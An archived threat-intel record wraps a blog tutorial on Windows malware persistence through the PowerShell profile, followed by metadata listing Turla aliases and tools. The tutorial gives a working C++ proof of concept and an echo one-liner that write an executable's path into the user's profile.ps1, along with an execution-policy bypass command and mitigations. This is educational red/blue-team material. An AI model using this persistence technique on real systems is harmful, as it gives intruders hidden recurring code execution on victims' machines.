{
    "id": "d45d3d28-6c38-4b03-aad6-803051b3df05",
    "created_at": "2023-01-12T15:08:51.783847Z",
    "updated_at": "2025-03-27T02:16:20.805031Z",
    "deleted_at": null,
    "sha1_hash": "892db4586e7bac610014c121771638242a4b6f9e",
    "title": "2022-09-20 - Malware development- persistence - part 11. Powershell profile. Simple Cplusplus example.",
    "authors": "",
    "file_creation_date": "2022-10-23T13:32:22Z",
    "file_modification_date": "2022-10-23T13:32:22Z",
    "file_size": 1448169,
    "plain_text": "# Malware development: persistence - part 11. Powershell profile. Simple C++ example.\n\n**[cocomelonc.github.io/malware/2022/09/20/malware-pers-11.html](https://cocomelonc.github.io/malware/2022/09/20/malware-pers-11.html)**\n\nSeptember 20, 2022\n\n3 minute read\n\n﷽\n\nHello, cybersecurity enthusiasts and white hackers!\n\nThis post is the result of self-researching one of the interesting malware persistence trick: via\npowershell profile.\n\n## powershell profile\n\nA PowerShell profile is a powershell script that allows system administrators and end users\nto configure their environment and perform specified commands when a Windows\nPowerShell session begins.\n\nThe PowerShell profile script is stored in the folder `WindowsPowerShell :`\n\n\n-----\n\nLet’s add the following code to a to the current user’s profile file, that will be performed\nwhenever the infected user enters a powershell console:\n\n```\nZ:\\2022-09-20-malware-pers-11\\hack.exe\n\n```\n\nI will demonstrate everything with a practical example and you will understand everything.\n\n## practical example\n\nFirstly, create our “malicious” file:\n```\n/*\nhack.cpp\n\nevil app for windows\n\npersistence via powershell profile\n\nauthor: @cocomelonc\n\nhttps://cocomelonc.github.io/malware/2022/09/20/malware-pers-11.html\n\n*/\n#include <windows.h>\n\n#pragma comment (lib, \"user32.lib\")\n\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int\nnCmdShow) {\n\n MessageBox(NULL, \"Meow-meow!\", \"=^..^=\", MB_OK);\n\n return 0;\n\n}\n\n\n```\nAs usually it is just “meow-meow” messagebox.\n\nCompile it:\n```\nx86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -I/usr/share/mingw-w64/include/ -s ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-allconstants -static-libstdc++ -static-libgcc -fpermissive\n\n```\n\n-----\n\nAnd we can run at victim machine for checking correctness:\n\nThen we do this simple “trick”:\n```\necho Z:\\2022-09-20-malware-pers-11\\hack.exe >\n\"%HOMEPATH%\\Documents\\windowspowershell\\profile.ps1\"\n\n\n```\nAnd finally, run powershell:\n```\npowershell -executionpolicy bypass\n\n```\n\n-----\n\n-----\n\nAs you can see, our malicious logic executed as expected and powershell is the parent\nprocess of our messagebox. =^..^=\n\nI created a simple PoC code to automate this process:\n\n\n-----\n\n```\n/\npers.cpp\n\nwindows persistence via Powershell profile\n\nauthor: @cocomelonc\n\nhttps://cocomelonc.github.io/malware/2022/09/20/malware-pers-11.html\n\n*/\n#include <windows.h>\n\n#include <stdio.h>\n\n#include <strsafe.h>\n\n#include <iostream>\n\nint main(int argc, char* argv[]) {\n\n char path[MAX_PATH];\n\n char *homepath = getenv(\"USERPROFILE\");\n\n char pspath[] = \"\\\\Documents\\\\windowspowershell\";\n\n char psprofile[] = \"\\\\profile.ps1\";\n\n char evil[] = \"Z:\\\\2022-09-20-malware-pers-11\\\\hack.exe\";\n\n DWORD evilLen = (DWORD)strlen(evil);\n\n StringCchCopy(path, MAX_PATH, homepath);\n\n StringCchCat(path, MAX_PATH, pspath);\n\n BOOL wd = CreateDirectoryA(path, NULL);\n\n if (wd == FALSE) {\n\n  printf(\"unable to create dir: %s\\n\", path);\n\n } else {\n\n  printf(\"successfully create dir: %s\\n\", path);\n\n }\n\n StringCchCat(path, MAX_PATH, psprofile);\n\n HANDLE hf = CreateFile(\n\n  path,\n\n  GENERIC_WRITE,\n\n  0,\n\n  NULL,\n\n  CREATE_NEW,\n\n  FILE_ATTRIBUTE_NORMAL,\n\n  NULL\n\n );\n\n if (hf == INVALID_HANDLE_VALUE) {\n\n  printf(\"unable to create file: %s\\n\", path);\n\n } else {\n\n  printf(\"successfully create file: %s\\n\", path);\n\n }\n\n BOOL wf = WriteFile(hf, evil, evilLen, NULL, NULL);\n\n if (wf == FALSE) {\n\n  printf(\"unable to write to file %s\\n\", path);\n\n } else {\n\n  printf(\"successfully write to file evil path: %s\\n\", evil);\n\n }\n\n\n```\n\n-----\n\n```\n CloseHandle(hf);\n\n return 0;\n\n}\n\n```\nThe logic is simple, this script just create profile folder if not exists, then create profile file and\nupdate it.\n\n## demo\n\nLet’s go to see everything in action. Compile our PoC:\n```\nx86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe -I/usr/share/mingw-w64/include/ -s ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-allconstants -static-libstdc++ -static-libgcc -fpermissive\n\n\n```\nAnd run it on the victim’s machine:\n```\n.\\pers.exe\n\n```\n\n-----\n\n-----\n\nAnd when powershell session is started:\n\n\n-----\n\nIf we check it via Process Hacker:\n\n\n-----\n\n```\npowershell.exe is the parent process again as expected.\n\n```\nAs you can see everything is worked perfectly! =^..^=\n\nBut there are the caveat. If powershell runned without execution policy bypass mode, this\npersistence trick not work in my case:\n\n\n-----\n\nAlso there are four places you can abuse the powershell profile, depending on the privileges\nyou have:\n```\n$PROFILE | select *\n\n```\n\n-----\n\nBy storing arbitrary instructions in the profile script, PowerShell profiles present several\nchances for code execution. To avoid relying on the user to start PowerShell, you may use a\nscheduled job that executes PowerShell at a certain time.\n\n## mitigations\n\nEnforce execution of only signed PowerShell scripts. Sign profiles to avoid them from being\nmodified. Also you can avoid PowerShell profiles if not needed, for example via `-No-`\n```\nProfile flag.\n\n```\n[This persistence trick is used by Turla in the wild.](https://attack.mitre.org/groups/G0010/)\n\nI hope this post spreads awareness to the blue teamers of this interesting technique, and\nadds a weapon to the red teamers arsenal.\n\n\n-----\n\n[Microsoft PowerShell profiles](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.2)\n[MITRE ATT&CK. Event Triggered Execution: PowerShell Profile](https://attack.mitre.org/techniques/T1546/013/)\n[Turla](https://attack.mitre.org/groups/G0010/)\n[source code on github](https://github.com/cocomelonc/2022-09-20-malware-pers-11)\n\nThis is a practical case for educational purposes only.\n\nThanks for your time happy hacking and good bye!\n\n_PS. All drawings and screenshots are mine_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-20 - Malware development- persistence - part 11. Powershell profile. Simple Cplusplus example..pdf"
    ],
    "report_names": [
        "2022-09-20 - Malware development- persistence - part 11. Powershell profile. Simple Cplusplus example..pdf"
    ],
    "threat_actors": [
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536131,
    "ts_updated_at": 1743041780,
    "ts_creation_date": 1666531942,
    "ts_modification_date": 1666531942,
    "files": {
        "pdf": "https://archive.orkl.eu/892db4586e7bac610014c121771638242a4b6f9e.pdf",
        "text": "https://archive.orkl.eu/892db4586e7bac610014c121771638242a4b6f9e.txt",
        "img": "https://archive.orkl.eu/892db4586e7bac610014c121771638242a4b6f9e.jpg"
    }
}